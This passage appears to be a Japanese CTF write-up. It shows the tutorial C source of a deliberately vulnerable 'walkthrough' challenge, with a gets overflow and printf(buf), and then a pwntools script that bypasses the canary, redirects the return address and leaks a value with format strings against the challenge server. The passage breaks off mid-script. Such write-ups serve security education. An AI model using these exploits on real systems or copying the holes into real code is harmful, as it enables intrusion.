+	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0xf</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x18</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">stk</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">);</span>
+
+	<span class="n">stkend</span><span class="p">();</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;As you can see, the stack contains many bits of information in a specific layout, so I will attempt to explain it.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;First off, local variables for the currently executing function are held at the top of the stack&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;This is why you see the char buf array at the top of the stack.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Variables that aren&#39;t initialized also contain the values held in the stack previously.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;This is why the buf array may contain some random values after the input string.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;However, the end of the inputted string is signified by a null byte placed by the gets function.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;After the buffer array, you can see something called a canary.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;This is a security protection against stack overflows, but it is only effective assuming the user doesn&#39;t know the canary value.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;It is a random value that is tested if it changed when a function returns.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Not all binaries have a canary, you can find out using the checksec command mentioned in the info section.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Probably most rop problems in ctf pwn do not use a canary, but I put one in here for educational purposes.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Next, the stack contains the base pointer for the rop function.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;This signifies where the stack frame will be when the current function returns.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;This is necessary because the stack needs to point back to the local variables and return address of the function that called it.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Now, we finally have the return address for the rop function.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;The return address points to where the code should continue running from after the function finishes.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;In this case, it points to code in the main function right after where the rop function is called.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;This is the value on the stack you want to overwrite to change the program to run whatever code you want to call next.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Lastly, you can see the base pointer and return address of the main function as well.&#34;</span><span class="p">);</span>
+       	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Once the rop function returns back to main, these values will be back at the top of the stack.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;After that the stack just has more local environment data that goes on for a while.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">dashdiv</span><span class="p">();</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">You now hopefully realize the general idea on how to rop to control the next function called.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;You need to input some amount of characters that reach up to the return address and correspond to the address you want to call.&#34;</span><span class="p">);</span>
+       	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;You also need to make sure to input characters that can correspond to the same value as the canary so it does not change value.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;However, you may be wondering how you are able to read past the buf array memory.&#34;</span><span class="p">);</span>
+ 	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Well, the function gets is quite insecure, so it will actually read as long of a string as you input, even if it is longer than the memory region it is being inputted into.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;This means if you just put a long enough string you can write past the buffer array and onto other stack values.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;You can test this by typing a bunch of a&#39;s to overwrite the canary and see a message pop up stating there has been stack smashing detected.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">dashdiv</span><span class="p">();</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">We will now use the pwntools python library to create the carefully crafted string perform the rop.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;First off, the binary does not used randomized addresses, meaning we can find the address ahead of time.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;We want to call the fmtstr function, and you can find the address of that function with this python code:&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&gt;&gt;&gt; e = ELF(&#39;./walkthrough&#39;)&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&gt;&gt;&gt; print(hex(e.sym[&#39;fmtstr&#39;])</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Now, to write an address as a string, you need to understand how memory holds numbers.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Most memory stores numbers in something called reverse endian order, where the lowest byte goes at the earliest address.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;That means for example, the number 0x69420 would look like the string &#39;</span><span class="se">\\</span><span class="s">x20</span><span class="se">\\</span><span class="s">x94</span><span class="se">\\</span><span class="s">x06&#39;&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Luckily, pwntools also has a function to automatically convert a hex value into a reverse endian string, like this:&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&gt;&gt;&gt; print(p64(0x69420))</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Finally, to communicate interact with a program, you can use these code snippets:&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&gt;&gt;&gt; p = process(&#39;./walkthrough&#39;) #use this one to test locally&#34;</span><span class="p">);</span>	
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&gt;&gt;&gt; p = remote(&#39;netcat.address&#39;, [port num]) #use this one to connect over netcat&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&gt;&gt;&gt; p.sendline(&#39;String to send&#39;)&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&gt;&gt;&gt; output_of_program = p.recv(256)&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&gt;&gt;&gt; output_line = p.recvline()&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&gt;&gt;&gt; output_until = p.recvuntil(&#39;input: &#39;)&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&gt;&gt;&gt; p.interactive() #allow user to input to program directly</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">dashdiv</span><span class="p">();</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Now, to finally put this information all together, you will need to write something like this:&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&gt;&gt;&gt; from pwn import *&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&gt;&gt;&gt; e = ELF(&#39;./walkthrough&#39;)&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&gt;&gt;&gt; p = process(e.path)&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&gt;&gt;&gt; p.recvuntil(&#39;later): &#39;)&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&gt;&gt;&gt; canary = int(p.recvline(keepends = False), 16) #keepends = False drop the newline character&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&gt;&gt;&gt; p.sendline(b&#39;a&#39; * x + p64(canary) + b&#39;a&#39; * y + p64(e.sym[&#39;fmtstr&#39;] + 1)) #figure out what x and y values should be&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;In this particular problem, notice you need the &#39;+ 1&#39; added fmtstr adr, which you won&#39;t normally need.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;This is due to future scanf calls needing a valid rbp value and this magically fixes it.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Also, you may find the following commands useful, though not necessary for an exploit:&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&gt;&gt;&gt; log.info(&#39;This func logs info to your terminal, for example the canary: &#39; + hex(canary))&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&gt;&gt;&gt; gdb.attach(p) #open a terminal with gdb containing the current state of your program</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Lastly, Pwntools also has a built in tool for calling complicated chains of multiple functions with parameters.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;You can read about it at https://docs.pwntools.com/en/stable/rop/rop.html, but it is not very useful for this problem.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;I hope you figured it out!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">fmtstr</span><span class="p">(){</span>
+	<span class="kt">long</span> <span class="n">num</span><span class="p">[</span><span class="mh">0x8</span><span class="p">];</span>
+	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x20</span><span class="p">];</span>
+	<span class="n">num</span><span class="p">[</span><span class="mh">0x0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x31415926535</span><span class="p">;</span>
+	<span class="n">num</span><span class="p">[</span><span class="mh">0x1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x696969696969</span><span class="p">;</span>
+	<span class="n">num</span><span class="p">[</span><span class="mh">0x2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x420420420420</span><span class="p">;</span>
+	<span class="n">num</span><span class="p">[</span><span class="mh">0x3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+	<span class="n">num</span><span class="p">[</span><span class="mh">0x4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+	<span class="n">num</span><span class="p">[</span><span class="mh">0x5</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span><span class="p">;</span>
+	<span class="n">num</span><span class="p">[</span><span class="mh">0x6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x133713371337</span><span class="p">;</span>
+	<span class="n">num</span><span class="p">[</span><span class="mh">0x7</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x123456789abc</span><span class="p">;</span>
+
+	<span class="n">divide</span><span class="p">();</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;FORMAT STRING:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\&#34;</span><span class="s">A function&#39;s greatest strength may also be its greatest weakness.</span><span class="se">\&#34;</span><span class="s"> - Sun Tzu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Nice job with the rop, looks like you made it here!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;You are going to have to guess a random number correctly.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;However, I will let you input a string into a buf array first. (using a more secure method without overflow)&#34;</span><span class="p">);</span>
+       	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;I will then pass that string in printf giving you a format string vulnrability that should allow you to leak the number.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;The number will be on the num array located on the stack.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Before I set that number, I will show you the stack.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">stkstrt</span><span class="p">();</span>
+
+	<span class="n">stk</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="s">&#34;(num start)&#34;</span><span class="p">);</span>
+	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x3</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">stk</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">);</span>
+	<span class="n">stk</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="s">&#34;(where guess value will be)&#34;</span><span class="p">);</span>
+	<span class="n">stk</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="s">&#34;(where random value will be)&#34;</span><span class="p">);</span>
+	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x5</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x7</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">stk</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">);</span>
+	<span class="n">stk</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">,</span> <span class="s">&#34;(num end)&#34;</span><span class="p">);</span>
+
+	<span class="n">stk</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="s">&#34;(buf start)&#34;</span><span class="p">);</span>
+	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x9</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0xb</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">stk</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">);</span>
+	<span class="n">stk</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="s">&#34;(buf end)&#34;</span><span class="p">);</span>
+
+	<span class="n">stk</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="mh">0xc</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">);</span>
+	<span class="n">stk</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="s">&#34;(canary)&#34;</span><span class="p">);</span>
+	<span class="n">stk</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="s">&#34;(fmtstr base ptr, messed up from rop)&#34;</span><span class="p">);</span>
+	<span class="n">stk</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">,</span> <span class="s">&#34;(fmtstr return adr, useless since exit func called at end of this function)&#34;</span><span class="p">);</span>
+	<span class="n">stk</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="s">&#34;(stuff below is useless now)&#34;</span><span class="p">);</span>
+	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x11</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x18</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">stk</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">);</span>
+
+	<span class="n">stkend</span><span class="p">();</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;I will now set the random number.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">num</span><span class="p">[</span><span class="mh">0x4</span><span class="p">]</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
+
+	<span class="n">dashdiv</span><span class="p">();</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Now, you may be wondering what a format string vulnerability is.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Well, you may be familiar with the function printf, which uses a string with formatters to create a specific output.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;See https://en.wikipedia.org/wiki/Printf_format_string for more info.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;When user input is passed in the first parameter where constant formatters are supposed to go this is called a format string vulnerability.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Ie the code &#39;printf(</span><span class="se">\&#34;</span><span class="s">\%s</span><span class="se">\&#34;</span><span class="s">, buf)&#39; is correct, but &#39;printf(buf)&#39; is vulnerable.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;With a carefully crafted input, a user can leak values on the stack and even write to addresses on the stack.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;You will only need to leak a value for this problem though.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;To see what I mean, I encourage you to experiment with the input &#39;\%[number]$llx&#39;, where you decide the number.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;I think you should be able to figure out the rest from here. :pray:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">dashdiv</span><span class="p">();</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Input the string that will be passed into printf.&#34;</span><span class="p">);</span>
+	<span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%31s&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">The printf result is:&#34;</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span> <span class="c1">//here is format string vuln, rest is info
+</span><span class="c1"></span>	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">dashdiv</span><span class="p">();</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Now input the value you&#39;re guessing.&#34;</span><span class="p">);</span>
+	<span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%lld&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">num</span><span class="p">[</span><span class="mh">0x3</span><span class="p">]);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Now testing if random and guess values are equal.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">dashdiv</span><span class="p">();</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+
+	<span class="k">if</span><span class="p">(</span><span class="n">num</span><span class="p">[</span><span class="mh">0x3</span><span class="p">]</span> <span class="o">==</span> <span class="n">num</span><span class="p">[</span><span class="mh">0x4</span><span class="p">]){</span>
+		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;You beat rng!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+		<span class="n">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span><span class="s">&#34;r&#34;</span><span class="p">);</span>
+		<span class="k">if</span><span class="p">(</span><span class="n">f</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
+			<span class="n">puts</span><span class="p">(</span><span class="s">&#34;If you are running locally, you need to create a file called &#39;flag.txt&#39; in the running progam&#39;s directory.&#34;</span><span class="p">);</span>
+			<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Otherwise, something is wrong. Please contact the author on discord.&#34;</span><span class="p">);</span>
+			<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+		<span class="p">}</span>
+
+		<span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span>
+
+		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;After all that program manipulation, here&#39;s the flag:&#34;</span><span class="p">);</span>
+		<span class="n">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;You failed baka.&#34;</span><span class="p">);</span>
+	<span class="p">}</span>
+
+	<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">outro</span><span class="p">(){</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;OUTRO:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Whoops, looks like you didn&#39;t rop anywhere.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Make sure to overflow all the way to the return address to control what function is called.&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+        <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">);</span>
+        <span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">);</span>
+	<span class="n">srand</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
+
+	<span class="n">ascii</span><span class="p">();</span>
+
+	<span class="n">divide</span><span class="p">();</span>
+
+	<span class="n">intro</span><span class="p">();</span>
+
+	<span class="n">divide</span><span class="p">();</span>
+
+	<span class="n">info</span><span class="p">();</span>
+
+	<span class="n">divide</span><span class="p">();</span>
+	
+	<span class="n">rop</span><span class="p">();</span>
+
+	<span class="n">divide</span><span class="p">();</span>
+
+	<span class="n">outro</span><span class="p">();</span>
+
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br /></p>
+<h3 id="solution">Solution</h3>
+<p>最初の Canary 回避のところまではほぼ説明文内のサンプル通りです。</p>
+<p>その次は Format string bug（書式文字列攻撃）で、スタックにある rand() の値を読み取ってそれを入力するとフラグが得られるというものです。</p>
+<p>こんな感じのコードになりました。14番目で rand() は取れます。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="hl"><span class="lnt">15
+</span></span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding:utf-8 -*-</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mi">15</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+    <span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./walkthrough&#39;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;147.182.172.217&#34;</span><span class="p">,</span> <span class="mi">42001</span><span class="p">)</span>
+    <span class="c1"># s = process(e.path)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;later): &#39;</span><span class="p">)</span>
+    <span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">keepends</span> <span class="o">=</span> <span class="bp">False</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="c1">#keepends = False drop the newline character</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x48</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;fmtstr&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span> <span class="c1">#figure out what x and y values should be</span>
+
+    <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Input the string that will be passed into printf.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="hl">    <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;%&#39;</span> <span class="o">+</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">))</span><span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;$llx&#39;</span><span class="p">)</span>
+</span>    <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;The printf result is:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Now input the value you&#39;re guessing.&#34;</span><span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
